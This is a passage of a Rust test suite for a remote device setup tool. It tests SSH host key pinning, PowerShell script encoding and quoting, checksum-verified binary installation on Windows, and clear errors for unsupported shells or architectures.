        .all(|ran| ran.starts_with("ssh -G ") || ran.starts_with("ssh-keygen -F ")));
    let _ = std::fs::remove_dir_all(paths.key.parent().unwrap());
}

#[tokio::test]
async fn a_pin_stays_when_your_known_hosts_differs_or_has_none() {
    let paths = temp_paths();
    let pin = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPinnedPinnedPinnedPinnedPinnedPinned";
    record_host_keys(&paths.known_hosts, "dev1", &[pin.into()]).unwrap();
    let before = std::fs::read_to_string(&paths.known_hosts).unwrap();
    let differs = knowing(&paths, &format!("devbox {KEY}\n"));
    assert_eq!(
        pin_known_host(&differs, &paths.known_hosts, "dev1", "devbox")
            .await
            .unwrap(),
        Pinning::Differs
    );
    let unknown = knowing(&paths, "");
    assert_eq!(
        pin_known_host(&unknown, &paths.known_hosts, "dev1", "devbox")
            .await
            .unwrap(),
        Pinning::Kept
    );
    assert_eq!(std::fs::read_to_string(&paths.known_hosts).unwrap(), before);
    assert_eq!(
        pinned_host_key(&paths.known_hosts, "dev1").as_deref(),
        Some(pin)
    );
    let _ = std::fs::remove_dir_all(paths.key.parent().unwrap());
}

#[tokio::test]
async fn nothing_is_pinned_when_your_known_hosts_has_no_ed25519_key() {
    let paths = temp_paths();
    let lookup = knowing(&paths, "devbox ssh-rsa BBBB\n");
    assert_eq!(
        pin_known_host(&lookup, &paths.known_hosts, "dev1", "devbox")
            .await
            .unwrap(),
        Pinning::Unknown
    );
    assert!(!paths.known_hosts.exists());
    let _ = std::fs::remove_dir_all(paths.key.parent().unwrap());
}

#[tokio::test]
async fn a_windows_pc_is_set_up_through_powershell() {
    let paths = temp_paths();
    let fake = Fake::windows(true);
    let confirms = Confirmations::default();
    let (steps, step) = collect();
    let prepared = Setup::new(&fake, &paths, "devbox")
        .unwrap()
        .prepare(windows_binary(&paths), &confirms, &step)
        .await
        .unwrap();
    assert_eq!(
        prepared,
        Prepared {
            host: "devbox".into(),
            home: r"C:\Users\dev".into(),
            target: "x86_64-pc-windows-msvc".into(),
            host_keys: vec![KEY.into()],
            host_keys_confirmed: true,
            linger: false,
        }
    );
    let line = r#"restrict,command="C:\Users\dev\AppData\Local\MaxHQ\bin\current\maxd.exe proxy" ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFakeFakeFakeFakeFakeFakeFakeFakeFakeFake maxhq"#;
    assert_eq!(
        *steps.lock().unwrap(),
        [
            Step::HostKey,
            Step::Probe,
            Step::Install,
            Step::Key { line: line.into() },
        ]
    );
    // After `sh` fails, every step is one PowerShell word cmd passes on.
    let remote = fake.remote();
    assert_eq!(remote.len(), 5, "{remote:?}");
    assert_eq!(remote[0], "sh -s");
    for command in &remote[1..] {
        let encoded = command.strip_prefix(POWERSHELL).unwrap();
        assert!(encoded
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || "+/=".contains(c)));
    }
    let scripts = fake.scripts();
    assert_eq!(scripts[0], windows::PROBE);
    assert!(scripts[1].starts_with(&format!(
        "$sum = '{}'\n$build = '{}'\n",
        "cd".repeat(32),
        "cd".repeat(8)
    )));
    assert!(scripts[1].contains("New-Item -ItemType Junction"));
    assert!(scripts[2].starts_with("$list = @('service', 'install')\n"));
    assert!(scripts[3].starts_with(
        "$list = @('authorize-key', 'ssh-ed25519', \
         'AAAAC3NzaC1lZDI1NTE5AAAAIFakeFakeFakeFakeFakeFakeFakeFakeFakeFake')\n"
    ));
    assert!(scripts[3].contains(r"'MaxHQ\bin\current\maxd.exe') @list"));
    // The binary goes over stdin to the install script.
    let stdin: Vec<_> = fake
        .ssh()
        .into_iter()
        .skip(1)
        .filter_map(|r| r.stdin)
        .collect();
    assert_eq!(stdin, [b"maxd"]);
    let _ = std::fs::remove_dir_all(paths.key.parent().unwrap());
}

#[tokio::test]
async fn a_windows_pc_takes_the_app_key_and_a_label_it_can_read() {
    for (label, shown) in [
        (
            "MaxHQ on the team's\nMac",
            "'MaxHQ on the team\u{2019}\u{2019}s Mac'",
        ),
        ("say \"hi\" C:\\", "'say \u{201D}hi\u{201D} C:'"),
        ("", "'MaxHQ'"),
        ("\\", "'MaxHQ'"),
    ] {
        let paths = temp_paths();
        let fake = Fake::windows(true);
        let confirms = Confirmations::default();
        let (_, step) = collect();
        let app_key = "B9sIh0gqNw8gm2y_XxV-Fa0e1lJ5nXcZ2rVf3pQb2kA";
        Setup::new(&fake, &paths, "devbox")
            .unwrap()
            .with_app_key(app_key, label)
            .unwrap()
            .prepare(windows_binary(&paths), &confirms, &step)
            .await
            .unwrap();
        let scripts = fake.scripts();
        let add = scripts.last().unwrap();
        assert!(
            add.starts_with(&format!(
                "$list = @('authorize-key', 'ssh-ed25519', \
                 'AAAAC3NzaC1lZDI1NTE5AAAAIFakeFakeFakeFakeFakeFakeFakeFakeFakeFake', \
                 '--app', '{app_key}', {shown})\n"
            )),
            "{label:?}: {add}"
        );
        let _ = std::fs::remove_dir_all(paths.key.parent().unwrap());
    }
}

#[tokio::test]
async fn a_windows_pc_on_its_build_isnt_sent_it_again() {
    let paths = temp_paths();
    let mut fake = Fake::windows(true);
    let probe = format!("{WINDOWS_PROBE}build={}\n", "cd".repeat(8));
    fake.windows = Some(probe);
    let confirms = Confirmations::default();
    let (_, step) = collect();
    Setup::new(&fake, &paths, "devbox")
        .unwrap()
        .prepare(windows_binary(&paths), &confirms, &step)
        .await
        .unwrap();
    assert_eq!(fake.remote().len(), 4);
    // Only the `sh` probe had stdin.
    assert!(fake.ssh().iter().skip(1).all(|r| r.stdin.is_none()));
    let _ = std::fs::remove_dir_all(paths.key.parent().unwrap());
}

#[tokio::test]
async fn git_bash_on_windows_still_gets_the_windows_setup() {
    let paths = temp_paths();
    let mut fake = Fake::windows(true);
    fake.sh = true;
    fake.probe = "uname=MINGW64_NT-10.0-19045 x86_64\nhome=/c/Users/dev\nuser=dev\n".into();
    let confirms = Confirmations::default();
    let (_, step) = collect();
    let prepared = Setup::new(&fake, &paths, "devbox")
        .unwrap()
        .prepare(windows_binary(&paths), &confirms, &step)
        .await
        .unwrap();
    assert_eq!(prepared.target, "x86_64-pc-windows-msvc");
    assert_eq!(prepared.home, r"C:\Users\dev");
    let _ = std::fs::remove_dir_all(paths.key.parent().unwrap());
}

#[tokio::test]
async fn a_unix_device_whose_probe_fails_says_why() {
    let paths = temp_paths();
    let mut fake = Fake::new(true);
    fake.sh = false;
    let confirms = Confirmations::default();
    let (_, step) = collect();
    let error = Setup::new(&fake, &paths, "devbox")
        .unwrap()
        .prepare(binary(&paths), &confirms, &step)
        .await
        .unwrap_err();
    assert!(
        error.to_string().contains("'sh' is not recognized"),
        "{error}"
    );
    // Nothing past the two probes ran.
    assert_eq!(fake.remote().len(), 2);
    let _ = std::fs::remove_dir_all(paths.key.parent().unwrap());
}

#[tokio::test]
async fn a_windows_pc_with_a_shell_the_key_line_cant_use_stops_with_the_fix() {
    for shell in [
        r"C:\Program Files\Git\bin\bash.exe",
        "C:\\msys64\\usr\\bin\\sh.exe",
    ] {
        let paths = temp_paths();
        let mut fake = Fake::windows(true);
        fake.windows = Some(WINDOWS_PROBE.replace("shell=\n", &format!("shell={shell}\n")));
        let confirms = Confirmations::default();
        let (_, step) = collect();
        let error = Setup::new(&fake, &paths, "devbox")
            .unwrap()
            .prepare(windows_binary(&paths), &confirms, &step)
            .await
            .unwrap_err();
        assert!(error.to_string().contains("Remove-ItemProperty"), "{error}");
        // It stops before anything is installed.
        assert_eq!(fake.remote().len(), 2);
        let _ = std::fs::remove_dir_all(paths.key.parent().unwrap());
    }
}

#[tokio::test]
async fn a_windows_pc_on_an_arch_with_no_maxd_says_so() {
    let paths = temp_paths();
    let mut fake = Fake::windows(true);
    fake.windows = Some(WINDOWS_PROBE.replace("arch=AMD64", "arch=x86"));
    let confirms = Confirmations::default();
    let (_, step) = collect();
    let error = Setup::new(&fake, &paths, "devbox")
        .unwrap()
        .prepare(windows_binary(&paths), &confirms, &step)
        .await
        .unwrap_err();
    assert_eq!(error.to_string(), "MaxHQ can't run on Windows on x86 yet");
    let _ = std::fs::remove_dir_all(paths.key.parent().unwrap());
}

#[test]
fn a_powershell_step_is_its_script_in_utf16_base64() {
    let script = "'caf\u{e9}' | Out-Host\n";
    let command = windows::powershell(script);
    assert!(command.starts_with(POWERSHELL));
    assert!(!command[POWERSHELL.len()..].contains(' '));
    assert_eq!(script_of(&command).as_deref(), Some(script));
    // `dir` in UTF-16LE, as PowerShell's own help shows it.
    assert_eq!(windows::powershell("dir"), format!("{POWERSHELL}ZABpAHIA"));
}

#[test]
fn powershell_literals_double_every_single_quote_it_reads() {
    assert_eq!(windows::literal("plain"), "'plain'");
    assert_eq!(windows::literal("it's"), "'it''s'");
    assert_eq!(
        windows::literal("\u{2018}a\u{2019} \u{201A}b\u{201B}"),
        "'\u{2018}\u{2018}a\u{2019}\u{2019} \u{201A}\u{201A}b\u{201B}\u{201B}'"
    );
    // `$` and backticks mean nothing in single quotes.
    assert_eq!(windows::literal("$env:X `n"), "'$env:X `n'");
    assert_eq!(windows::literal(""), "''");
}

#[test]
fn native_arguments_keep_what_windows_powershell_passes_whole() {
    assert_eq!(windows::native_arg(r#"say "hi""#), "say \u{201D}hi\u{201D}");
    assert_eq!(windows::native_arg(r"C:\dir\\"), r"C:\dir");
    assert_eq!(windows::native_arg(r"a\b"), r"a\b");
    assert_eq!(
        windows::run_maxd(&["x y", "it's"]),
        format!("$list = @('x y', 'it''s')\n{}", windows::RUN_MAXD)
    );
}

#[test]
fn the_windows_install_checks_the_sum_before_it_points_current_at_it() {
    let script = windows::install(&"ab".repeat(32), &"ab".repeat(8));
    assert!(script.starts_with(&format!(
        "$sum = '{}'\n$build = '{}'\n",
        "ab".repeat(32),
        "ab".repeat(8)
    )));
    let check = script.find("Get-FileHash").unwrap();
    let swap = script.find("Junction").unwrap();
    assert!(check < swap);
    for script in [windows::PROBE, windows::INSTALL, windows::RUN_MAXD] {
        assert!(script.contains("MaxHQ"));
        assert!(!script.contains("Set-ExecutionPolicy"));
    }
}

#[test]
fn only_a_windows_probe_gives_windows_facts() {
    let facts = windows::facts(WINDOWS_PROBE).unwrap();
    assert_eq!(facts["arch"], "AMD64");
    assert_eq!(facts["local"], r"C:\Users\dev\AppData\Local");
    assert_eq!(windows::facts("uname=Linux x86_64\nhome=/home/dev\n"), None);
    assert_eq!(windows::facts("os=\n"), None);
    assert_eq!(windows::facts(""), None);
    for uname in [
        "MINGW64_NT-10.0-19045 x86_64",
        "MSYS_NT-10.0 x86_64",
        "CYGWIN_NT-10.0 x86_64",
    ] {
        assert!(windows::posix_layer(uname), "{uname}");
    }
    for uname in ["Linux x86_64", "Darwin arm64", ""] {
        assert!(!windows::posix_layer(uname), "{uname}");
    }
}

#[test]
fn windows_on_two_arches_has_a_target() {
    assert_eq!(target_for_windows("AMD64"), Some("x86_64-pc-windows-msvc"));
    assert_eq!(target_for_windows("amd64"), Some("x86_64-pc-windows-msvc"));
    assert_eq!(target_for_windows("ARM64"), Some("aarch64-pc-windows-msvc"));
    assert_eq!(target_for_windows("x86"), None);
    assert_eq!(target_for_windows(""), None);
}

#[test]
fn the_key_line_runs_under_cmd_and_powershell_only() {
    let plain = r"C:\Users\dev\AppData\Local\MaxHQ\bin\current\maxd.exe";
    let spaced = r"C:\Users\Dev User\AppData\Local\MaxHQ\bin\current\maxd.exe";
    for shell in ["", " ", "cmd", r"C:\Windows\System32\cmd.exe", "CMD.EXE"] {
        assert_eq!(shell_refusal(shell, spaced), None, "{shell}");
    }
    for shell in [
        r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        r"C:\Program Files\PowerShell\7\pwsh.exe",
    ] {
        assert_eq!(shell_refusal(shell, plain), None, "{shell}");
        let why = shell_refusal(shell, spaced).unwrap();
        assert!(why.contains("has a space"), "{why}");
    }
    let why = shell_refusal(r"C:\Program Files\Git\bin\bash.exe", plain).unwrap();
    assert!(why.starts_with(
        r"OpenSSH on this PC runs commands through C:\Program Files\Git\bin\bash.exe"
    ));
    assert!(why.contains("Remove-ItemProperty -Path HKLM:\\SOFTWARE\\OpenSSH -Name DefaultShell"));
}
